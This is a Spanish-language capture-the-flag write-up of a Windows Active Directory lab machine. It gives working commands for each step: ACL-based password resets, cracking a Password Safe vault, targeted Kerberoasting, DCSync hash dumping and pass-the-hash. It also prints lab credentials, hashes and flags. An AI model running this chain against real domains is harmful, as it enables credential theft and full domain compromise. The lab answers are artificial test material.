# Máquina: Administrator

- **Sistema Operativo:** Windows
- **Dificultad:** Media
- **Técnicas clave:** Active Directory, bloodyAD, ACL manipulation, Shadow Credentials

---

![Pasted image 20260625194709.png](assets/Pasted%20image%2020260625194709.png)

Como es común en las pruebas de Windows de la vida real, iniciará el cuadro Administrador con las credenciales para la siguiente cuenta: Nombre de usuario: Olivia Contraseña: ichliebedich

fase uno reconocimiento:

![Pasted image 20260625200300.png](assets/Pasted%20image%2020260625200300.png)

el escaneo mostro a administrator escuchando por ese puerto pero primero probar nuestro usuario y pass 

![Pasted image 20260625200745.png](assets/Pasted%20image%2020260625200745.png)

comando:

```shell
nxc smb 10.129.18.160 -u 'Olivia' -p 'ichliebedich' --shares
```

probamos que el usuario olivia pertenese los recursos compartidos no hay nada importante asi que nos descargamos la configuracion del ad con bloodhound


pero primero agregamos el dminio al /etc/hosts/![Pasted image 20260625202716.png](assets/Pasted%20image%2020260625202716.png)

comando y repo dela herramienta:
https://github.com/gzzcoo/iRealm

```shell
sudo iRealm -i 10.129.18.160 -d administrator.htb -n DC --force
```

![Pasted image 20260625204036.png](assets/Pasted%20image%2020260625204036.png)

comando:

```shell
bloodyAD --host 10.129.18.160 -d administrator.htb -u 'Olivia' -p 'ichliebedich' get bloodhound
```

podemos mirar que el usuario olivia tiene la acl de cambiar la contrasena de el usuario michael asi que la cambiamos

![Pasted image 20260625205320.png](assets/Pasted%20image%2020260625205320.png)

![Pasted image 20260625205842.png](assets/Pasted%20image%2020260625205842.png)

comandos:

```shell
bloodyAD --host 10.129.18.160 -d administrator.htb -u 'Olivia' -p 'ichliebedich' set password 'Michael' 'pepe123'
```

```shell
nxc smb 10.129.18.160 -u 'michael' -p 'pepe123' --shares
```

ya en el blood miramos que el usuario michael tiene acl de  ForceChangePassword sobre el usuario benjamin asi que le cambiamos la pass

![Pasted image 20260625210359.png](assets/Pasted%20image%2020260625210359.png)

![Pasted image 20260625210831.png](assets/Pasted%20image%2020260625210831.png)

comandos:

```shell
bloodyAD --host 10.129.18.160 -d administrator.htb -u 'Michael' -p 'pepe123' set password 'Benjamin' 'setensa1'
```

```shell
nxc smb 10.129.18.160 -u 'benjamin' -p 'setensa1' --shares
```

ya luego de eso miramos que benjamin pertenese a un grupo que no es normal![Pasted image 20260625211450.png](assets/Pasted%20image%2020260625211450.png)

si miramos orita lo primero pudimos ver que algo en ftp estaba escuchado como administrator asi que con este usuario y su pass intentamos entrar  

```
ftp 10.129.18.160
```

usuario: benjamin
pass: setensa1

![Pasted image 20260625215023.png](assets/Pasted%20image%2020260625215023.png)

descargamos un archivo llamado `Backup.psafe3` al abrir el archivo nos topamos con esto
![Pasted image 20260625215747.png](assets/Pasted%20image%2020260625215747.png)

el archivo esta en psafe3 pero que es esto

 `.psafe3` es la extensión de archivo de **Password Safe 3**, que es un gestor de contraseñas (como KeePass, 1Password, etc.).

**Password Safe** es un programa que:

- Guarda contraseñas encriptadas en un archivo
- Las protege con una **Master Password** (contraseña maestra)
- Permite organizar credenciales por categorías

El archivo `.psafe3` contiene:

- Contraseñas guardadas
- Nombres de usuario
- URLs
- Notas
- Organizadas en carpetas

asi que tenemos que romperlo

![Pasted image 20260625220108.png](assets/Pasted%20image%2020260625220108.png)

comando:

```
hashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```

y la pass es : tekieromucho

asi que miramos que hay en el safe  al entrar nos pedira pass ponemos la de te quiero mucho 
![Pasted image 20260625221927.png](assets/Pasted%20image%2020260625221927.png)

comando:

```
pwsafe ~/administrator/content/Backup.psafe3
```

![Pasted image 20260625222146.png](assets/Pasted%20image%2020260625222146.png)

le damos clik derecho a emily y copiamos la pass luego la berificamos

![Pasted image 20260625222351.png](assets/Pasted%20image%2020260625222351.png)

nos conectamos por evil y sacamos la primera flag![Pasted image 20260625222739.png](assets/Pasted%20image%2020260625222739.png)

comando:

```
evil-winrm -i 10.129.18.160 -u 'Emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

```
type user.txt
```

![Pasted image 20260625222852.png](assets/Pasted%20image%2020260625222852.png)

flag: aa0ba54f43d46d5e7f96cb832ad2b5ca

luego en el blood miramos que emyli tiene acl de generi write sobre el usuario etha ![Pasted image 20260625223526.png](assets/Pasted%20image%2020260625223526.png)

para abusar de esto ala cuenta de Ethan sele agrega un spn y se berifica que se agrego![Pasted image 20260625235058.png](assets/Pasted%20image%2020260625235058.png)

comando:

```
Set-ADUser -Identity ethan -ServicePrincipalNames @{Add="HTTP/ethan.administrator.htb"}
```

```
Get-ADUser ethan -Properties serviceprincipalname | Select-Object serviceprincipalname
```

ya luego se se sincroniza el relo y se ejecuta este comando para obtener el ntlmv2 para romper![Pasted image 20260626070151.png](assets/Pasted%20image%2020260626070151.png)

comando:

```shell
sudo systemctl stop systemd-timesyncd
sudo ntpdate -s 10.129.18.160
timedatectl
```

nota estos comandos no son casi funcionales al 100 por que tube muchos problemas al sincronizar la ora

```shell
python3 targetedKerberoast.py --dc-ip 10.129.18.160 -d administrator.htb -k -U ethan.txt
```

guardamos y rompemos![Pasted image 20260626071038.png](assets/Pasted%20image%2020260626071038.png) 

```shell
echo '$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$8580eb6354f34014cbb4bf491f75a83e$bd86ef25d806cdbd468d2887bd3032475d1caaf3845fab9e09e5e7be64a595b740714668ad86abfce742bf45c835c1e882907740165c2b699945d82e046ddca34be464d42d11e2c24a498f58c9df67ad63ab5d1d09dfe660dcda03c589e380411880d0f1b3010a3a4555c8136dfd8b49bf21da8b395761557e7d090ab9c33fb7db73401dd7e062f4067005d6e0ac7a3a90f550e38932bf3a1e0a0225545a075a5ab5562341735b623f5592a2b392a8d677569ab10ac34d48479eec9ff5dfa0ba8a2bfdac8967fa27c270ba5fde54510f300b354095bbd7eb002535e73ceea8120a47624208f4ca2632e0b304709e2f3c5f8b303fd4e5cca6c3771aadcf893f6ba6c78b4c2e257eb277dd9385a7f54a5b5e0ba00d17b5998e1ae359cf7f4d77fa5252a0548f31958ae6590821b093bb229aeab84e736866c9e60f48ad55aa433e5fa874a131814a832e9e035bed249fcbf4c64190edfd392e40b740a45b3aa0ec71e4fcf25b2613eb32f333c24ede8cc92331d271cb62d1772631f2fc0ad3d3b4c0799f79ec751f120ed4839a4aa20c4f9eb51cffe3598bd7f10dc30fdd2e83680a3601b9df62cb5da4f892665f976f018533db3343a524d68f726e1a545501eadda0aa1bd5e5d1c92f0a68db5ac8e543167a51ac2f76f4fabe7d54131fcd5f4ac47f27e1eb28437660bde2981aaa1ba9df956b58117700e2b37cc40b90a6e27ba45d7dfa66deb32ec0b907e3def172acfda8631024a9dfd39040093f0d3c35b5a96d7e5a313b9124ffe353badb14776e51f7d7a5812aec9d0eb4dc1aa5da786cd811d4d4d73d57378dd814941fb2403b45afc57580e49a08ab62d21c2c86140fa8f1709361dad7ecc494d476c856b368563c851d416ca4396dda4a228c55731cb7bc53d6d94dfe97c4e85f1890946608f8097f881bbf64a0926c6fafd2196bb77d2b6b56a4733c18e8f8c8190a6c1db0a93ffb0586a49ea26ec945973165974d6e6e99a574fbfda75d34f4e87006cd2fcc6bfd316a4be4a2ad1a47368579031fbd2abf0a86a79a89f12fcae7802e7da4b59570952dcd1f2e9521ae30bd0fa97fd1f284aeb3067c7e62b03f99cd206674792f90941f7b083f72cb1777969046d198ab0939935ef25e34705c7ef497be7c3899cd4a8eae4522e7c2feab74736dd445b9b0e4cb137abbd9fa5370ece8f3af2c09567a8a6d9ab79efd58446bafdf929a0dff8e149d5eea686bc2e5f963ff4ba1348e93ef97d23ec444f361089495221d6910cb0286b563e7ecbc935cb61b8ffa1cbedcccac75d402a7f52d2113ae03548d217e42e671a00420f240fb94837ef59b1adda8535d7566f18a31b3dafeb4d44c8a783505267b65a586faa098264e0fd07bc4c13780590fc1d30d12f8ac72eba3f839af2c38d774e40ecc3707cb458652c79a00d43dc2299ff4cec5a749a2b5d405f3661c05696f74690ec5d18c9c5716fc876730b4c4fd1e7581edba35a70ec585bcded3ff85b962a062d18382523d33fc1fd4088de3bbcf0858c070d1' > ethan_hash.txt
```

```shell
hashcat -m 13100 ethan_hash.txt /usr/share/wordlists/rockyou.txt
```

![Pasted image 20260626071314.png](assets/Pasted%20image%2020260626071314.png)

pass: limpbizkit

probamos y funciona![Pasted image 20260626071550.png](assets/Pasted%20image%2020260626071550.png)

ya como este usuario en blood nos dise que tenemos DCSync pero que es esto 
**DCSync** es un ataque que aprovecha los permisos de replicación de Active Directory.

**¿Qué es?**

- Normalmente solo los Domain Controllers pueden **replicar datos** (sincronizarse) del directorio
- DCSync permite a un usuario **impersonar un Domain Controller** y solicitar los hashes de contraseña de **TODOS los usuarios**

![Pasted image 20260626072221.png](assets/Pasted%20image%2020260626072221.png)

sabiendo esto sacamos los hash ntlm ![Pasted image 20260626072630.png](assets/Pasted%20image%2020260626072630.png)

comando:
 
```shell
secretsdump.py -dc-ip 10.129.18.160 administrator.htb/ethan:limpbizkit@10.129.18.160
```

asemos pass the hash con admin 

![Pasted image 20260626073413.png](assets/Pasted%20image%2020260626073413.png)

```
evil-winrm -i 10.129.18.160 -u 'Administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
```

![Pasted image 20260626073529.png](assets/Pasted%20image%2020260626073529.png)

flag root: b48594654dcd1883ea401061be3763cf

echa por: JAVIKRD

![Pasted image 20260626075813.png](assets/Pasted%20image%2020260626075813.png)


Windows Privilege Escalation
